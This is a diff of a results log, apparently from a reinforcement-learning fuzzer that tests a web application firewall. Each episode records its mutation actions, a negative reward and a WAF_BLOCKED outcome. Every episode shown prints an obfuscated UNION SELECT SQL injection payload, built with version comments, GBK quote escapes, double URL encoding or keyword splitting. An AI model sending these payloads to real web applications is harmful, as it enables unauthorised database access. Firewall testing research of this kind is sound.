@@ -6,23 +6,23 @@
     "success": false,
     "final_result": "WAF_BLOCKED",
     "sequence": [
-      "vtab",
-      "comment",
-      "crlf",
-      "comment",
-      "plus_sep",
-      "hex_encode",
-      "nested_union",
+      "tab_space",
       "comment",
       "comment",
       "comment",
       "newline",
+      "hash_nl_all",
+      "gbk_bypass",
+      "paren_space",
+      "nested_or",
       "comment",
       "comment",
-      "newline",
+      "hash_nl_all",
+      "paren_space",
+      "scientific",
       "comment"
     ],
-    "final_payload": "0'%0bUNIunionON%0bSELselectECT%0b0x31,0x32,0x33;%00"
+    "final_payload": "0%bf%27%09UNION(SELECT/**/(1),(2),(3;%00))"
   },
   {
     "episode": 2,
@@ -32,22 +32,22 @@
     "final_result": "WAF_BLOCKED",
     "sequence": [
       "comment",
+      "comment",
+      "nested_union",
+      "formfeed",
+      "comment",
+      "comment",
+      "hex_encode",
+      "comment",
+      "comment",
+      "comment",
+      "newline",
       "tab_space",
-      "param_pollute",
-      "case",
       "comment",
       "comment",
-      "comment",
-      "newline",
-      "comment",
-      "comment",
-      "newline",
-      "comment",
-      "comment",
-      "newline",
-      "comment"
+      "nested_or"
     ],
-    "final_payload": "0'/**/uNIOn/*&x=1*/SelECT/*&x=1*/1,2,3;%00"
+    "final_payload": "0'/**/UNIunionON/**/SELselectECT/**/1,2,3;%00"
   },
   {
     "episode": 3,
@@ -58,21 +58,21 @@
     "sequence": [
       "newline",
       "comment",
+      "url_encode",
+      "comment",
+      "hex_encode",
+      "ver_newline",
       "comment",
       "comment",
       "newline",
       "comment",
+      "newline",
+      "ver_newline",
       "comment",
-      "paren_space",
-      "comment",
-      "formfeed",
-      "comment",
-      "convert_charset",
-      "nested_union",
-      "comment",
-      "ver_00000"
+      "hash_nl_all",
+      "comment"
     ],
-    "final_payload": "0'%0aUNI/*!00000union*/ON(SEL/*!00000select*/ECT/**/(1),(2),(3;%00))"
+    "final_payload": "0'%0a%55NION%0a%53ELECT%0a1,2,3;%00"
   },
   {
     "episode": 4,
@@ -82,22 +82,22 @@
     "final_result": "WAF_BLOCKED",
     "sequence": [
       "crlf",
+      "nested_or",
+      "comment",
+      "comment",
+      "paren_full",
+      "comment",
+      "paren_space",
+      "comment",
       "comment",
       "newline",
-      "newline",
-      "double_or",
-      "comment",
-      "nested_and",
-      "comment",
-      "url_mid_char",
-      "comment",
-      "formfeed",
-      "newline",
+      "tab_space",
       "comment",
       "comment",
-      "newline"
+      "plus_sep",
+      "paren_space"
     ],
-    "final_payload": "0'%0d%0aUN%49ON%0d%0aSEL%45CT%0d%0a1,2,3;%00"
+    "final_payload": "0'%0d%0aUNION(SELECT/**/(1),(2),(3;%00))"
   },
   {
     "episode": 5,
@@ -106,23 +106,23 @@
     "success": false,
     "final_result": "WAF_BLOCKED",
     "sequence": [
-      "tab_space",
-      "tab_space",
+      "vtab",
+      "comment",
+      "gbk_bypass",
+      "nested_union",
       "comment",
       "comment",
-      "between_space",
       "comment",
-      "nested_or",
-      "between_space",
-      "paren_space",
+      "formfeed",
       "comment",
       "comment",
       "newline",
+      "param_pollute",
+      "paren_space",
       "comment",
-      "comment",
-      "newline"
+      "comment"
     ],
-    "final_payload": "0'%09UNION(SELECT/**/(1),(2),(3;%00))"
+    "final_payload": "0%bf%27%0bUNIunionON%0bSELselectECT%0b1,2,3;%00"
   },
   {
     "episode": 6,
@@ -131,23 +131,23 @@
     "success": false,
     "final_result": "WAF_BLOCKED",
     "sequence": [
-      "formfeed",
+      "double_or",
+      "comment",
+      "vtab",
+      "ver_urlenc",
+      "nested_or",
+      "between_space",
       "comment",
       "comment",
-      "plus_sep",
-      "paren_full",
-      "crlf",
-      "hash_nl",
+      "param_pollute",
       "comment",
-      "hex_encode",
-      "hex_encode",
       "comment",
       "newline",
       "comment",
       "comment",
-      "newline"
+      "gbk_bypass"
     ],
-    "final_payload": "0'%0cUNION%23xyz%0ASELECT%0c0x30x31,0x32,0x33;%00"
+    "final_payload": "0%bf%27/**//*!50000%55NION*//**//*!50000%53ELECT*//**/1,2,3;%00"
   },
   {
     "episode": 7,
@@ -156,23 +156,23 @@
     "success": false,
     "final_result": "WAF_BLOCKED",
     "sequence": [
-      "between_space",
-      "comment",
-      "comment",
-      "comment",
       "formfeed",
-      "newline",
+      "nested_or",
+      "comment",
+      "nested_and",
+      "comment",
+      "tab_space",
       "comment",
       "comment",
-      "ver_00000",
+      "double_and",
+      "nested_or",
       "comment",
-      "comment",
-      "newline",
-      "paren_full",
+      "tab_space",
+      "nested_and",
       "comment",
       "comment"
     ],
-    "final_payload": "0'%a0/*!00000UNION*/%a0/*!00000SELECT*/%a01,2,3;%00"
+    "final_payload": "0'%0cUNION%0cSELECT%0c1,2,3;%00"
   },
   {
     "episode": 8,
@@ -181,23 +181,23 @@
     "success": false,
     "final_result": "WAF_BLOCKED",
     "sequence": [
-      "plus_sep",
-      "comment",
-      "comment",
-      "comment",
-      "tab_space",
       "convert_charset",
-      "ver_newline",
       "comment",
+      "newline",
+      "vtab",
+      "comment",
+      "comment",
+      "comment",
+      "double_and",
+      "comment",
+      "nested_union",
       "comment",
       "tab_space",
+      "ver_50000",
       "comment",
-      "comment",
-      "comment",
-      "ver_00000",
-      "comment"
+      "distinct"
     ],
-    "final_payload": "0'+%0A/*!50000%55NION*/+/*!%53ELECT*/%0A+1,2,3;%00"
+    "final_payload": "0'/**/UNI/*!50100union*/ON/**/SEL/*!50100select*/ECT/**/1,2,3;%00"
   },
   {
     "episode": 9,
@@ -206,23 +206,23 @@
     "success": false,
     "final_result": "WAF_BLOCKED",
     "sequence": [
-      "formfeed",
-      "ver_urlenc",
-      "distinct",
-      "formfeed",
-      "scientific",
+      "between_space",
+      "comment",
       "comment",
       "comment",
       "newline",
-      "plus_sep",
       "comment",
       "comment",
-      "case_split",
+      "newline",
       "comment",
       "comment",
-      "newline"
+      "formfeed",
+      "comment",
+      "comment",
+      "backtick",
+      "comment"
     ],
-    "final_payload": "0'%0c/*!50000%55NION*/%0c/*!50000%53ELECT*/%0c1,2,3;%00"
+    "final_payload": "0'%a0`UNION`%a0`SELECT`%a01,2,3;%00"
   },
   {
     "episode": 10,
@@ -231,23 +231,23 @@
     "success": false,
     "final_result": "WAF_BLOCKED",
     "sequence": [
+      "case",
       "double_encode",
+      "paren_full",
+      "gbk_bypass",
       "comment",
-      "newline",
-      "hash_nl_all",
-      "comment",
-      "newline",
       "nested_union",
       "comment",
       "comment",
-      "crlf",
-      "hash_nl_all",
+      "newline",
       "comment",
-      "ver_newline",
-      "crlf",
+      "ver_urlenc",
+      "comment",
+      "paren_space",
+      "gbk_bypass",
       "comment"
     ],
-    "final_payload": "0'%2520UNI%0A/*!50000%55nion*/ON%2520SEL/*!%53elect*/%0AECT%25201,2,3;%00"
+    "final_payload": "0%bf%27%2520UNiOn%2520SElect%25201,2,3;%00"
   },
   {
     "episode": 11,
@@ -256,151 +256,26 @@
     "success": false,
     "final_result": "WAF_BLOCKED",
     "sequence": [
+      "nested_or",
+      "comment",
       "tab_space",
-      "newline",
-      "url_mid_char",
       "comment",
-      "case",
+      "crlf",
       "comment",
-      "comment",
-      "newline",
-      "between_space",
+      "dbl_url_comment",
       "comment",
       "hex_encode",
       "comment",
+      "formfeed",
       "comment",
-      "ver_newline",
+      "nested_and",
+      "comment",
       "comment"
     ],
-    "final_payload": "0'%09UN%49ON%09SEL%45CT%091,2,3;%00"
+    "final_payload": "0'%252f%252a*/UNION%252f%252a*/SELECT%252f%252a*/1,2,3;%00"
   },
   {
     "episode": 12,
-    "steps": 15,
-    "total_reward": -39.6,
-    "success": false,
-    "final_result": "WAF_BLOCKED",
-    "sequence": [
-      "comment",
-      "comment",
-      "vtab",
-      "dbl_url_comment",
-      "dbl_url_comment",
-      "paren_full",
-      "ver_00000",
-      "comment",
-      "case_split",
-      "comment",
-      "comment",
-      "newline",
-      "convert_charset",
-      "comment",
-      "gbk_bypass"
-    ],
-    "final_payload": "0%bf%27%252f%252a*//*!00000uNIon*/%252f%252a*//*!00000selECT*/%252f%252a*/1,2,3;%00"
-  },
-  {
-    "episode": 13,
-    "steps": 15,
-    "total_reward": -39.6,
-    "success": false,
-    "final_result": "WAF_BLOCKED",
-    "sequence": [
-      "case",
-      "comment",
-      "newline",
-      "comment",
-      "comment",
-      "nested_union",
-      "hash_nl_all",
-      "comment",
-      "newline",
-      "comment",
-      "comment",
-      "hash_nl_all",
-      "comment",
-      "comment",
-      "vtab"
-    ],
-    "final_payload": "0'/**/uniON/**/seLECT/**/1,2,3;%00"
-  },
-  {
-    "episode": 14,
-    "steps": 15,
-    "total_reward": -39.6,
-    "success": false,
-    "final_result": "WAF_BLOCKED",
-    "sequence": [
-      "paren_space",
-      "paren_space",
-      "paren_full",
-      "formfeed",
-      "comment",
-      "tab_space",
-      "comment",
-      "paren_full",
-      "comment",
-      "comment",
-      "between_space",
-      "paren_full",
-      "tab_space",
-      "comment",
-      "comment"
-    ],
-    "final_payload": "0'%0cUNION(SELECT%0c(1),(2),(3;%00))"
-  },
-  {
-    "episode": 15,
-    "steps": 15,
-    "total_reward": -39.6,
-    "success": false,
-    "final_result": "WAF_BLOCKED",
-    "sequence": [
-      "tab_space",
-      "crlf",
-      "paren_space",
-      "comment",
-      "comment",
-      "between_space",
-      "comment",
-      "comment",
-      "ver_00000",
-      "comment",
-      "newline",
-      "param_pollute",
-      "comment",
-      "comment",
-      "newline"
-    ],
-    "final_payload": "0'%09/*!00000UNION*/(/*!00000SELECT*//**/(1),(2),(3;%00))"
-  },
-  {
-    "episode": 16,
-    "steps": 15,
-    "total_reward": -39.6,
-    "success": false,
-    "final_result": "WAF_BLOCKED",
-    "sequence": [
-      "case_split",
-      "char_split",
-      "nested_or",
-      "comment",
-      "newline",
-      "hash_nl_all",
-      "gbk_bypass",
-      "comment",
-      "plus_sep",
-      "comment",
-      "comment",
-      "newline",
-      "comment",
-      "comment",
-      "newline"
-    ],
-    "final_payload": "0%bf%27/**/UNIoN/**/sElEcT/**/1,2,3;%00"
-  },
-  {
-    "episode": 17,
     "steps": 15,
     "total_reward": -39.6,
     "success": false,
@@ -412,17 +287,142 @@
       "comment",
       "newline",
       "comment",
-      "tab_space",
+      "hash_nl",
       "comment",
       "comment",
       "comment",
       "newline",
+      "keyword_split",
       "comment",
-      "comment",
-      "newline",
+      "hash_nl_all",
       "comment"
     ],
     "final_payload": "0'/**/%55NION/**/%53ELECT/**/1,2,3;%00"
+  },
+  {
+    "episode": 13,
+    "steps": 15,
+    "total_reward": -39.6,
+    "success": false,
+    "final_result": "WAF_BLOCKED",
+    "sequence": [
+      "plus_sep",
+      "comment",
+      "nested_and",
+      "nested_or",
+      "case",
+      "nested_or",
+      "comment",
+      "nested_and",
+      "comment",
+      "comment",
+      "newline",
+      "comment",
+      "newline",
+      "tab_space",
+      "comment"
+    ],
+    "final_payload": "0'+uNIOn+seLEct+1,2,3;%00"
+  },
+  {
+    "episode": 14,
+    "steps": 15,
+    "total_reward": -39.6,
+    "success": false,
+    "final_result": "WAF_BLOCKED",
+    "sequence": [
+      "tab_space",
+      "newline",
+      "comment",
+      "crlf",
+      "comment",
+      "vtab",
+      "comment",
+      "newline",
+      "plus_sep",
+      "comment",
+      "comment",
+      "newline",
+      "paren_space",
+      "comment",
+      "comment"
+    ],
+    "final_payload": "0'%09UNION(SELECT/**/(1),(2),(3;%00))"
+  },
+  {
+    "episode": 15,
+    "steps": 15,
+    "total_reward": -39.6,
+    "success": false,
+    "final_result": "WAF_BLOCKED",
+    "sequence": [
+      "double_encode",
+      "ver_00000",
+      "comment",
+      "comment",
+      "char_split",
+      "comment",
+      "comment",
+      "ver_50000",
+      "comment",
+      "comment",
+      "plus_sep",
+      "vtab",
+      "comment",
+      "comment",
+      "newline"
+    ],
+    "final_payload": "0'%2520/*!00000/*U*//*N*//*I*//*O*//*N*/*/%2520/*!00000/*S*//*E*//*L*//*E*//*C*//*T*/*/%25201,2,3;%00"
+  },
+  {
+    "episode": 16,
+    "steps": 15,
+    "total_reward": -39.6,
+    "success": false,
+    "final_result": "WAF_BLOCKED",
+    "sequence": [
+      "case_split",
+      "comment",
+      "crlf",
+      "newline",
+      "case",
+      "comment",
+      "nested_and",
+      "comment",
+      "tab_space",
+      "comment",
+      "comment",
+      "newline",
+      "comment",
+      "comment",
+      "newline"
+    ],
+    "final_payload": "0'/**/UnIon/**/selECt/**/1,2,3;%00"
+  },
+  {
+    "episode": 17,
+    "steps": 15,
+    "total_reward": -39.6,
+    "success": false,
+    "final_result": "WAF_BLOCKED",
+    "sequence": [
+      "url_mid_char",
+      "convert_charset",
+      "newline",
+      "comment",
+      "newline",
+      "hex_encode",
+      "newline",
+      "comment",
+      "nested_union",
+      "comment",
+      "comment",
+      "newline",
+      "comment",
+      "comment",
+      "newline"
+    ],
+    "final_payload": "0'%0aUN%49ON%0aSEL%45CT%0a1,2,3;%00"
   },
   {
     "episode": 18,
@@ -431,23 +431,23 @@
     "success": false,
     "final_result": "WAF_BLOCKED",
     "sequence": [
-      "formfeed",
-      "newline",
-      "newline",
-      "concat_char",
+      "char_split",
+      "comment",
+      "scientific",
+      "comment",
       "comment",
       "newline",
-      "comment",
+      "newline",
       "hash_nl_all",
       "comment",
+      "nested_and",
+      "paren_space",
       "comment",
-      "newline",
-      "comment",
-      "newline",
+      "double_or",
       "comment",
       "tab_space"
     ],
-    "final_payload": "0'%0cUNION%0cSELECT%0c1,2,3;%00"
+    "final_payload": "0'%0a/*U*//*N*//*I*//*O*//*N*/%0a/*S*//*E*//*L*//*E*//*C*//*T*/%0a1,2,3;%00"
   },
   {
     "episode": 19,
@@ -456,23 +456,23 @@
     "success": false,
     "final_result": "WAF_BLOCKED",
     "sequence": [
-      "url_mid_char",
+      "keyword_split",
+      "vtab",
+      "case_split",
       "comment",
+      "hex_encode",
+      "distinct",
       "crlf",
-      "formfeed",
       "comment",
-      "tab_space",
+      "vtab",
       "comment",
       "comment",
-      "tab_space",
-      "unhex_wrap",
+      "param_pollute",
       "comment",
-      "nested_union",
-      "formfeed",
-      "comment",
-      "newline"
+      "hash_nl",
+      "crlf"
     ],
-    "final_payload": "0'/**/UN%49ON/**/SEL%45CT/**/1,2,3;%00"
+    "final_payload": "0'%0bUN/**/ION%0bSEL/**/ECT%0b1,2,3;%00"
   },
   {
     "episode": 20,
@@ -481,23 +481,23 @@
     "success": false,
     "final_result": "WAF_BLOCKED",
     "sequence": [
-      "keyword_split",
-      "hash_nl",
-      "comment",
-      "unhex_wrap",
-      "comment",
-      "hash_nl_all",
-      "newline",
-      "comment",
       "crlf",
       "comment",
-      "newline",
-      "tab_space",
+      "comment",
+      "ver_50000",
+      "comment",
+      "between_space",
+      "paren_full",
+      "comment",
       "comment",
       "case_split",
+      "comment",
+      "dbl_url_comment",
+      "crlf",
+      "comment",
       "comment"
     ],
-    "final_payload": "0'/**/UN/**/ION/**/SEL/**/ECT/**/1,2,3;%00"
+    "final_payload": "0'%0d%0a/*!50000uNiOn*/%0d%0a/*!50000SELEcT*/%0d%0a1,2,3;%00"
   },
   {
     "episode": 21,
@@ -506,23 +506,23 @@
     "success": false,
     "final_result": "WAF_BLOCKED",
     "sequence": [
-      "char_split",
-      "dbl_url_comment",
+      "ver_50000",
+      "hash_nl",
       "comment",
-      "between_space",
-      "comment",
-      "hash_nl_all",
-      "hash_nl_all",
+      "newline",
       "case",
       "comment",
-      "formfeed",
-      "crlf",
-      "case",
+      "newline",
       "comment",
-      "case",
-      "newline"
+      "tab_space",
+      "comment",
+      "comment",
+      "double_or",
+      "comment",
+      "newline",
+      "comment"
     ],
-    "final_payload": "0'%a0/*U*//*N*//*I*//*O*//*N*/%a0/*S*//*E*//*L*//*E*//*C*//*T*/%a01,2,3;%00"
+    "final_payload": "0'%0a/*!40100UnIOn*/%0a/*!40100sELecT*/%0a1,2,3;%00"
   },
   {
     "episode": 22,
@@ -531,23 +531,23 @@
     "success": false,
     "final_result": "WAF_BLOCKED",
     "sequence": [
-      "crlf",
+      "ver_00000",
       "newline",
-      "newline",
-      "tab_space",
       "comment",
-      "tab_space",
-      "double_encode",
-      "comment",
-      "newline",
-      "newline",
+      "hash_nl",
       "comment",
       "comment",
       "crlf",
+      "ver_newline",
+      "char_split",
+      "between_space",
+      "formfeed",
       "comment",
-      "ver_newline"
+      "tab_space",
+      "between_space",
+      "comment"
     ],
-    "final_payload": "0'%0d%0a%0A/*!50000%55NION*/%0d%0a/*!%53ELECT*/%0A%0d%0a1,2,3;%00"
+    "final_payload": "0'%0a/*!00000/*U*//*N*//*I*//*O*//*N*/*/%0a/*!00000/*S*//*E*//*L*//*E*//*C*//*T*/*/%0a1,2,3;%00"
   },
   {
     "episode": 23,
@@ -556,23 +556,23 @@
     "success": false,
     "final_result": "WAF_BLOCKED",
     "sequence": [
-      "ver_50000",
+      "ver_12345",
       "comment",
-      "paren_full",
+      "newline",
+      "char_split",
+      "comment",
+      "param_pollute",
       "comment",
       "comment",
       "newline",
       "comment",
       "comment",
-      "convert_charset",
-      "paren_full",
-      "comment",
-      "comment",
-      "comment",
       "newline",
-      "comment"
+      "comment",
+      "comment",
+      "paren_space"
     ],
-    "final_payload": "0'%0a/*!50000UNION*/%0a/*!50000SELECT*/%0a1,2,3;%00"
+    "final_payload": "0'%0a/*!12345/*U*//*N*//*I*//*O*//*N*//**//*S*//*E*//*L*//*E*//*C*//*T*/*/%0a1,2,3;%00"
   },
   {
     "episode": 24,
@@ -581,23 +581,23 @@
     "success": false,
     "final_result": "WAF_BLOCKED",
     "sequence": [
-      "nested_and",
+      "url_encode",
+      "newline",
       "comment",
-      "nested_or",
-      "param_pollute",
       "comment",
       "newline",
+      "ver_00000",
+      "comment",
+      "url_mid_char",
+      "comment",
+      "scientific",
+      "hash_nl",
+      "comment",
+      "comment",
       "newline",
-      "tab_space",
-      "comment",
-      "tab_space",
-      "between_space",
-      "tab_space",
-      "comment",
-      "between_space",
-      "comment"
+      "tab_space"
     ],
-    "final_payload": "0'/**/UNION/*&q=*/SELECT/*&q=*/1,2,3;%00"
+    "final_payload": "0'%0a%55NION%0a%53ELECT%0a1,2,3;%00"
   },
   {
     "episode": 25,
@@ -606,23 +606,23 @@
     "success": false,
     "final_result": "WAF_BLOCKED",
     "sequence": [
-      "ver_00000",
-      "paren_full",
+      "vtab",
+      "convert_charset",
       "comment",
-      "paren_space",
+      "formfeed",
       "comment",
-      "hex_encode",
+      "between_space",
       "comment",
+      "tab_space",
+      "newline",
+      "url_mid_char",
+      "comment",
+      "nested_union",
       "comment",
       "newline",
-      "comment",
-      "newline",
-      "newline",
-      "paren_full",
-      "newline",
-      "newline"
+      "nested_or"
     ],
-    "final_payload": "0'%0a/*!00000UNION*/%0a/*!00000SELECT*/%0a1,2,3;%00"
+    "final_payload": "0'%0bUN%49ON%0bSEL%45CT%0b1,2,3;%00"
   },
   {
     "episode": 26,
@@ -631,23 +631,23 @@
     "success": false,
     "final_result": "WAF_BLOCKED",
     "sequence": [
-      "ver_12345",
-      "keyword_split",
-      "comment",
-      "nested_or",
-      "comment",
+      "paren_full",
       "formfeed",
       "comment",
+      "plus_sep",
       "comment",
+      "double_encode",
+      "ver_urlenc",
       "newline",
       "comment",
-      "paren_space",
       "comment",
-      "hex_encode",
+      "crlf",
+      "dbl_url_comment",
       "comment",
-      "comment"
+      "comment",
+      "plus_sep"
     ],
-    "final_payload": "0'%0c/*!12345UN/**/ION/**/SEL/**/ECT*/%0c1,2,3;%00"
+    "final_payload": "0'%0c/*!50001%55NION*/%0c/*!50001%53ELECT*/%0c1,2,3;%00"
   },
   {
     "episode": 27,
@@ -657,19 +657,19 @@
     "final_result": "WAF_BLOCKED",
     "sequence": [
       "ver_urlenc",
-      "char_split",
+      "comment",
+      "comment",
+      "comment",
+      "url_mid_char",
       "comment",
       "comment",
       "newline",
-      "plus_sep",
+      "comment",
       "comment",
       "newline",
       "comment",
-      "paren_full",
+      "vtab",
       "comment",
-      "double_or",
-      "comment",
-      "hex_encode",
       "comment"
     ],
     "final_payload": "0'%0a/*!50000%55NION*/%0a/*!50000%53ELECT*/%0a1,2,3;%00"
@@ -683,21 +683,21 @@
     "sequence": [
       "ver_newline",
       "comment",
-      "comment",
-      "distinct",
-      "comment",
-      "plus_sep",
-      "comment",
-      "backtick",
-      "comment",
-      "comment",
-      "distinct",
+      "hash_nl",
+      "unhex_wrap",
+      "hash_nl_all",
       "comment",
       "comment",
       "newline",
-      "paren_full"
+      "comment",
+      "comment",
+      "newline",
+      "comment",
+      "comment",
+      "newline",
+      "convert_charset"
     ],
-    "final_payload": "0'/**/%0A/*!50000%55NION*/+/*!%53ELECT*/%0A/**/1,2,3;%00"
+    "final_payload": "0'/**/%0A/*!50000%55NION*/%23xx%0A/*!%53ELECT*/%0A/**/1,2,3;%00"
   },
   {
     "episode": 29,
@@ -706,23 +706,23 @@
     "success": false,
     "final_result": "WAF_BLOCKED",
     "sequence": [
-      "paren_full",
-      "nested_and",
+      "paren_space",
+      "ver_50000",
+      "comment",
+      "double_encode",
+      "comment",
+      "comment",
+      "comment",
       "newline",
-      "crlf",
+      "hex_encode",
       "comment",
-      "crlf",
       "comment",
-      "tab_space",
+      "newline",
       "comment",
-      "double_or",
-      "tab_space",
-      "url_encode",
       "comment",
-      "char_split",
-      "comment"
+      "newline"
     ],
-    "final_payload": "0'%0a%55NION%0a%53ELECT%0a1,2,3;%00"
+    "final_payload": "0'%2520/*!50100UNION*/(/*!50100SELECT*/%2520(1),(2),(3;%00))"
   },
   {
     "episode": 30,
@@ -736,18 +736,18 @@
       "comment",
       "comment",
       "newline",
-      "distinct",
       "comment",
       "comment",
       "newline",
       "comment",
       "comment",
-      "tab_space",
+      "newline",
+      "paren_full",
       "comment",
-      "double_encode",
-      "comment"
+      "comment",
+      "newline"
     ],
-    "final_payload": "0'/**/UNION%23aaa%0ASELECT/**/1,2,3;%00"
+    "final_payload": "0'/**/UNION%23xyz%0ASELECT/**/1,2,3;%00"
   },
   {
     "episode": 31,
@@ -756,23 +756,23 @@
     "success": false,
     "final_result": "WAF_BLOCKED",
     "sequence": [
-      "hash_nl",
-      "newline",
-      "paren_full",
+      "hash_nl_all",
+      "vtab",
       "comment",
-      "paren_full",
+      "comment",
+      "newline",
+      "hex_encode",
       "comment",
       "double_and",
-      "formfeed",
+      "comment",
       "comment",
       "newline",
+      "comment",
+      "comment",
       "newline",
-      "tab_space",
-      "case",
-      "distinct",
       "comment"
     ],
-    "final_payload": "0'/**/uniOn%23xyz%0ASeleCt/**/1,2,3;%00"
+    "final_payload": "0'%23aa%0AUNION%23aa%0ASELECT%23aa%0A1,2,3;%00"
   },
   {
     "episode": 32,
@@ -782,22 +782,22 @@
     "final_result": "WAF_BLOCKED",
     "sequence": [
       "param_pollute",
-      "formfeed",
       "comment",
+      "dbl_url_comment",
       "comment",
-      "newline",
-      "comment",
-      "comment",
-      "newline",
-      "comment",
-      "nested_or",
-      "comment",
+      "double_or",
       "comment",
       "comment",
       "plus_sep",
-      "param_pollute"
+      "comment",
+      "comment",
+      "nested_and",
+      "comment",
+      "comment",
+      "newline",
+      "comment"
     ],
-    "final_payload": "0'%0cUNION/*&a=*/SELECT/*&a=*/1,2,3;%00"
+    "final_payload": "0'%252f%252a*/UNION/*&a=*/SELECT/*&a=*/1,2,3;%00"
   },
   {
     "episode": 33,
@@ -806,23 +806,23 @@
     "success": false,
     "final_result": "WAF_BLOCKED",
     "sequence": [
-      "hash_nl_all",
+      "nested_and",
       "comment",
+      "formfeed",
+      "comment",
+      "ver_00000",
       "comment",
       "comment",
       "newline",
       "comment",
+      "scientific",
+      "formfeed",
+      "newline",
       "comment",
-      "crlf",
       "comment",
-      "backtick",
-      "comment",
-      "hash_nl",
-      "hex_encode",
-      "hash_nl",
-      "comment"
+      "newline"
     ],
-    "final_payload": "0'%23aa%0A`UNION`%23aa%0A`SELECT`%23aa%0A1,2,3;%00"
+    "final_payload": "0'/**//*!00000UNION*//**//*!00000SELECT*//**/1,2,3;%00"
   },
   {
     "episode": 34,
@@ -831,23 +831,23 @@
     "success": false,
     "final_result": "WAF_BLOCKED",
     "sequence": [
-      "plus_sep",
-      "newline",
-      "nested_and",
+      "nested_union",
       "comment",
+      "hex_encode",
+      "nested_union",
       "crlf",
       "comment",
-      "vtab",
-      "scientific",
+      "newline",
       "comment",
+      "tab_space",
       "comment",
-      "formfeed",
-      "comment",
+      "crlf",
+      "paren_full",
       "comment",
       "newline",
       "comment"
     ],
-    "final_payload": "0'+UNION+SELECT+1,2,3;%00"
+    "final_payload": "0'/**/UNIunionON/**/SELselectECT/**/1,2,3;%00"
   },
   {
     "episode": 35,
@@ -856,23 +856,23 @@
     "success": false,
     "final_result": "WAF_BLOCKED",
     "sequence": [
-      "nested_or",
+      "url_mid_char",
+      "comment",
+      "between_space",
       "comment",
       "formfeed",
       "newline",
-      "double_or",
       "comment",
-      "vtab",
-      "comment",
+      "ver_urlenc",
+      "nested_or",
+      "hash_nl",
+      "nested_or",
       "hash_nl",
       "comment",
-      "crlf",
-      "comment",
-      "comment",
-      "formfeed",
-      "case"
+      "paren_full",
+      "comment"
     ],
-    "final_payload": "0'/**/unION%23foo%0AseLECt/**/1,2,3;%00"
+    "final_payload": "0'/**/UN%49ON/**/SEL%45CT/**/1,2,3;%00"
   },
   {
     "episode": 36,
@@ -881,23 +881,23 @@
     "success": false,
     "final_result": "WAF_BLOCKED",
     "sequence": [
-      "nested_union",
-      "comment",
-      "comment",
+      "url_encode",
+      "case_split",
+      "unhex_wrap",
       "comment",
       "hex_encode",
-      "nested_or",
-      "comment",
-      "paren_space",
-      "hex_encode",
-      "comment",
       "comment",
       "newline",
       "comment",
+      "ver_urlenc",
+      "double_or",
+      "crlf",
+      "comment",
       "concat_char",
+      "ver_50000",
       "comment"
     ],
-    "final_payload": "0'/**/UNIunionON/**/SELselectECT/**/1,2,3;%00"
+    "final_payload": "0'/**/%55NION/**/%53ELECT/**/1,2,3;%00"
   },
   {
     "episode": 37,
@@ -906,23 +906,23 @@
     "success": false,
     "final_result": "WAF_BLOCKED",
     "sequence": [
-      "double_or",
+      "double_and",
       "comment",
-      "between_space",
-      "comment",
-      "crlf",
-      "crlf",
-      "between_space",
-      "ver_newline",
-      "comment",
+      "plus_sep",
+      "case",
       "newline",
       "comment",
+      "newline",
+      "newline",
       "tab_space",
-      "plus_sep",
+      "formfeed",
       "comment",
-      "tab_space"
+      "tab_space",
+      "comment",
+      "tab_space",
+      "newline"
     ],
-    "final_payload": "0'/**/%0A/*!50000%55NION*//**//*!%53ELECT*/%0A/**/1,2,3;%00"
+    "final_payload": "0'/**/uNIOn/**/sElecT/**/1,2,3;%00"
   },
   {
     "episode": 38,
@@ -931,23 +931,23 @@
     "success": false,
     "final_result": "WAF_BLOCKED",
     "sequence": [
-      "double_and",
-      "comment",
-      "plus_sep",
+      "hex_encode",
       "comment",
       "vtab",
+      "plus_sep",
+      "comment",
+      "comment",
+      "comment",
+      "newline",
+      "comment",
+      "comment",
+      "newline",
+      "comment",
       "param_pollute",
       "comment",
-      "tab_space",
-      "newline",
-      "newline",
-      "tab_space",
-      "comment",
-      "unhex_wrap",
-      "comment",
-      "tab_space"
+      "comment"
     ],
-    "final_payload": "0'/**/UNION/*&id=*/SELECT/*&id=*/1,2,3;%00"
+    "final_payload": "0'/**/UNION/*&q=*/SELECT/*&q=*/0x31,0x32,0x33;%00"
   },
   {
     "episode": 39,
@@ -956,23 +956,23 @@
     "success": false,
     "final_result": "WAF_BLOCKED",
     "sequence": [
-      "hex_encode",
-      "unhex_wrap",
-      "comment",
-      "comment",
-      "comment",
-      "scientific",
-      "concat_char",
-      "ver_00000",
-      "comment",
-      "url_encode",
-      "comment",
-      "comment",
-      "comment",
+      "url_mid_char",
       "newline",
+      "newline",
+      "newline",
+      "tab_space",
+      "comment",
+      "comment",
+      "crlf",
+      "hash_nl_all",
+      "comment",
+      "tab_space",
+      "comment",
+      "crlf",
+      "paren_full",
       "comment"
     ],
-    "final_payload": "0'/**//*!00000%55NION*//**//*!00000%53ELECT*//**/0e0x31,0x32,0x33;%00"
+    "final_payload": "0'%0aUN%49ON%0aSEL%45CT%0a1,2,3;%00"
   },
   {
     "episode": 40,
@@ -982,22 +982,22 @@
     "final_result": "WAF_BLOCKED",
     "sequence": [
       "scientific",
+      "hash_nl",
+      "backtick",
       "comment",
-      "double_encode",
-      "nested_and",
-      "comment",
-      "formfeed",
-      "comment",
-      "formfeed",
-      "newline",
-      "newline",
       "crlf",
       "newline",
+      "newline",
+      "tab_space",
+      "double_encode",
       "comment",
-      "hash_nl_all",
-      "nested_and"
+      "tab_space",
+      "nested_or",
+      "comment",
+      "tab_space",
+      "comment"
     ],
-    "final_payload": "0'/**/UNION/**/SELECT/**/1e0,2e0,3e0;%00"
+    "final_payload": "0'/**/`UNION`%23foo%0A`SELECT`/**/1e0,2e0,3e0;%00"
   },
   {
     "episode": 41,
@@ -1006,23 +1006,23 @@
     "success": false,
     "final_result": "WAF_BLOCKED",
     "sequence": [
-      "url_mid_char",
-      "newline",
-      "tab_space",
-      "newline",
-      "vtab",
-      "gbk_bypass",
+      "concat_char",
       "comment",
+      "double_encode",
       "comment",
       "newline",
-      "comment",
-      "tab_space",
-      "comment",
-      "comment",
       "newline",
-      "nested_union"
+      "hash_nl_all",
+      "between_space",
+      "comment",
+      "crlf",
+      "comment",
+      "paren_space",
+      "url_encode",
+      "comment",
+      "hex_encode"
     ],
-    "final_payload": "0%bf%27%0aUN%49ON%0aSEL%45CT%0a1,2,3;%00"
+    "final_payload": "0'/**/%55NION(%53ELECT/**/(1),(2),(3;%00))"
   },
   {
     "episode": 42,
@@ -1031,23 +1031,23 @@
     "success": false,
